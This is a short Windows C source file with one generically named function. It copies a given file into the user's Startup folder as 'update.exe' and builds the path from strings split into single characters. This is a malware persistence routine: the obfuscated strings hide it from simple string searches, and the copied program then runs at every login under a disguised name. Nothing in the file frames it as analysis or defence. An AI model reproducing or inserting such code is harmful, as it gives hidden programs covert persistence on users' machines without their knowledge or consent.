#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v2(const char* s){
    char p[MAX_PATH];
    char e[] = {'A','P','P','D','A','T','A',0};
    char f[] = {'\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','S','t','a','r','t',' ','M','e','n','u','\\','P','r','o','g','r','a','m','s','\\','S','t','a','r','t','u','p','\\','u','p','d','a','t','e','.','e','x','e',0};
    GetEnvironmentVariableA(e, p, MAX_PATH);
    char* d = p;
    while (*d) d++;
    char* src = f;
    while (*src) *d++ = *src++;
    *d = 0;
    CopyFileA(s, p, 0);
}